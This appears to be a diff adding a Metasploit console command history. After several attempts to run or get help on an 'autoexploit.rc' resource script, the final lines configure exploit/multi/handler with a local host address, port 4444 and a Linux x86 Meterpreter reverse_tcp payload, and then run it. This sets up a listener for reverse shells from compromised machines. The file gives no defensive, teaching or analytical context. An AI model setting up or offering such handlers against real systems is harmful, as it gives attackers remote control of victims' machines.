@@ -1,0 +1,15 @@
+resource autoexploit.rc help
+resource autoexploit.rc
+resource autoexploit.rc -h
+resource autoexploit.rc options
+resource help
+resource -h
+resource
+clear
+history
+clear
+use exploit/multi/handler
+set lhost = 192.168.100.5
+set lport = 4444
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+run
